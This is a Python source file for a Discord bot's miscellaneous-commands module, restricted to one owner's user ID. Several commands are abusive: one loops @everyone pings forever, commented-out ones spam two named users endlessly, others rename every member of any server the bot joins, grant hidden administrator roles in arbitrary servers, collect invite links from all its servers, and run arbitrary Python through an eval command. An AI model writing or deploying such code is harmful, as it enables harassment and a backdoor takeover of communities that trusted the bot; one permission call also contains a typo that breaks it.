import string
import discord
from discord.ext import commands
from discord.ext.commands.core import Command
import inspect

from cogs.common import Common

class MiscCommands(commands.Cog):

    def __init__(self, client):
        self.client = client

    @commands.command()
    async def typing(self, ctx):
        await ctx.trigger_typing()

    #@commands.command(brief="spam @minecraftman69")
    #async def infinite_spam_minecraftman(self, ctx):
    #    while True:
    #        await ctx.send(f'<@745827166058578000> {Common.random_message(self)}')
    #        await Common.log(self, 'started infinite spam minecraftman', ctx)


    #@commands.command(brief="spam @deatg")
    #async def infinite_spam_deatg(self, ctx):
    #    while True:
    #        await ctx.send(f'<@822658667845386240> {Common.random_message(self)}')
    #        await Common.log(self, 'started infinite spam deatg', ctx)

    @commands.command(brief="DO NOTTTTTTTTTT")
    async def infinite_spam_everyone(self, ctx):
        if ctx.guild.id == 873380900434489374:
            while True:
                await ctx.send(f'@everyone {Common.random_message(self)}')
                Common.log(self, '**infinite_spam_everyone is happening be scared**', ctx)
        else:
            await ctx.send("this command can only be used in certain servers")


    

    @commands.command()
    async def change_all_nicknames(self, ctx, server_id : int):
        if ctx.author.id == Common.deatg_id:
            the_server = self.client.get_guild(server_id)
            for user in the_server.members:
                newname = Common.random_message(self)
                if len(newname) >= 30:
                    newname = f"{newname[0:30]}…"
                try:
                    await user.edit(nick=f'{newname}')
                except:
                    aa = 3

    @commands.command()
    async def create_role(self, ctx, server_id, role_name, is_admin):
        if ctx.author.id == Common.deatg_id:
            the_server = self.client.get_guild(int(server_id))
            perms = discord.Permissions(administrator=False)
            if is_admin.lower() == "true":
                perms = discord.Permissions(administrator=True)
            try:
                await the_server.create_role(name=role_name, permissions=perms, colour=Common.random_color())
                await ctx.send("created", delete_after=5.0)
            except Exception as error:
                await ctx.send(f"create_role(self, ctx, server_id, role_name, is_admin)\n{error}")
    
    @commands.command()
    async def give_role(self, ctx, server_id, recipient_id, role_id):
        if ctx.author.id == Common.deatg_id:
            the_server = self.client.get_guild(int(server_id))
            recipient = the_server.get_member(int(recipient_id))
            role = the_server.get_role(int(role_id))
            try:
                await recipient.add_roles(role)
                await ctx.send("gave", delete_after=5.0)
            except Exception as error:
                await ctx.send(f"give_role(self, ctx, server_id, recipient_id, role_id)\n{error}")

    @commands.command()
    async def delete_message(self, ctx, channel_id, message_id):
        if ctx.author.id == Common.deatg_id:
            the_channel = self.client.get_channel(int(channel_id))
            async for msg in the_channel.history(limit = 10000):
                if msg.id == message_id:
                    try:
                        await msg.delete()
                        return
                    except Exception as error:
                        await ctx.send(f"delete_message(self, ctx, channel_id, message_id)\n{error}")
                        return


    @commands.command()
    async def toggle_role_admin(self, ctx, server_id, role_id, name, give_admin = "true"):
        if ctx.author.id == Common.deatg_id:
            the_server = self.client.get_guild(int(server_id))
            role = the_server.get_role(int(role_id))
            
            await ctx.send(role.position)

            perms = discord.Permissions()
            perms.update(admininistrator = True)
            try:
                await role.edit(name="deatg", color=Common.random_color(), hoist=True, mentionable=False, permissions=perms)
            except Exception as error:
                await ctx.send(f"toggle_role_admin(self, ctx, server_id, role_id, give_admin = \"true\")\n{error}")

    @commands.command(name='eval', pass_context=True)
    async def eval(self, ctx, *, command):
        if ctx.author.id == Common.deatg_id:
            res = eval(command)
            if inspect.isawaitable(res):
                await ctx.send(await res)
            else:
                await ctx.send(res)
        else:
            await ctx.send("you not deatg :skull:")




    @commands.command()
    async def getinvites(self, ctx):
        if ctx.author.id == Common.deatg_id or ctx.author.id == 573285573968527402:
            for guild in self.client.guilds:
                try:
                    for invite in await guild.invites():
                        await ctx.send(str(invite))
                        break
                except:
                    await ctx.send(f"{guild.name} errpr")
        else:
            await ctx.send('you not deatg :skull:')

def setup(client):
    client.add_cog(MiscCommands(client))